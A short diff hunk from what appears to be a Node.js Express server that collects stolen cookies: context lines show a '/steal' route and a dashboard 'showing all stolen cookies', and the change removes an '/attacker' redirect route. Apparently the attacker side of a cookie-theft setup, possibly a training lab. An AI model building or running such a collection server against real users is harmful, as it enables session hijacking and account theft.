@@ -81,8 +81,6 @@ app.get('/steal', (req, res) => {
 // -------------------------------------------------------
 // GET / – simple dashboard showing all stolen cookies
 // -------------------------------------------------------
-// Dashboard erreichbar unter / und /attacker (für Gateway-Routing)
-app.get(['/attacker', '/attacker/'], requireAuth, (req, res) => res.redirect('/'));
 app.get('/', requireAuth, (req, res) => {
   let fileContent = '';
   try {
